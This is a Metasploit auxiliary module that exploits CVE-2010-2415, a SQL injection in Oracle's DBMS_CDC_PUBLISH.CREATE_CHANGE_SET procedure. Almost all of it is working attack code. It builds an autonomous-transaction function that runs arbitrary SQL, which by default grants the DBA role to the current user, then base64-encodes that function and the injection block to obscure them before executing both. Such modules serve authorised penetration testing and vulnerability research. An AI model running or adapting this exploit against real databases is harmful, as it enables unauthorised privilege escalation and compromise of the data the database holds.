##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::ORACLE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.CREATE_CHANGE_SET',
        'Description' => %q{
          The module exploits an sql injection flaw in the CREATE_CHANGE_SET
          procedure of the PL/SQL package DBMS_CDC_PUBLISH. Any user with execute privilege
          on the vulnerable package can exploit this vulnerability. By default, users granted
          EXECUTE_CATALOG_ROLE have the required privilege.
        },
        'Author' => [ 'MC' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2010-2415' ],
          [ 'OSVDB', '70078'],
          [ 'URL', 'http://www.oracle.com/technetwork/topics/security/cpuoct2010-175626.html' ],
        ],
        'DisclosureDate' => '2010-10-13',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('SQL', [ false, 'SQL to execute.', "GRANT DBA TO #{datastore['DBUSER']}"]),
      ]
    )
  end

  def run
    return if !check_dependencies

    name = Rex::Text.rand_text_alpha_upper(1..10)
    var1 = Rex::Text.rand_text_alpha_upper(1..10)
    var2 = Rex::Text.rand_text_alpha_upper(1..10)

    function = "
CREATE OR REPLACE FUNCTION #{name}
RETURN VARCHAR2 AUTHID CURRENT_USER
IS
PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
EXECUTE IMMEDIATE '#{datastore['SQL']}';
COMMIT;
RETURN NULL;
END;
    "

    # PROCEDURE CREATE_CHANGE_SET
    # Argument Name			Type			In/Out Default?
    # ------------------------------ ----------------------- ------ --------
    # CHANGE_SET_NAME		VARCHAR2		IN
    # DESCRIPTION			VARCHAR2		IN     DEFAULT
    # CHANGE_SOURCE_NAME		VARCHAR2		IN		<-boom ;)
    # STOP_ON_DDL			CHAR			IN     DEFAULT
    # BEGIN_DATE			DATE			IN     DEFAULT
    # END_DATE			DATE			IN     DEFAULT

    package = "
BEGIN
SYS.DBMS_CDC_PUBLISH.CREATE_CHANGE_SET('#{name}','#{name}','''||'||user||'.#{name}||''');
END;
    "

    uno = Rex::Text.encode_base64(function)
    dos = Rex::Text.encode_base64(package)

    encoded_sql = %|
DECLARE
#{var1} VARCHAR2(32767);
#{var2} VARCHAR2(32767);
BEGIN
#{var1} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{uno}')));
EXECUTE IMMEDIATE #{var1};
#{var2} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{dos}')));
EXECUTE IMMEDIATE #{var2};
END;
    |

    print_status('Attempting sql injection on SYS.DBMS_CDC_PUBLISH.CREATE_CHANGE_SET...')
    prepare_exec(encoded_sql)
    print_status('Done...')
  end
end
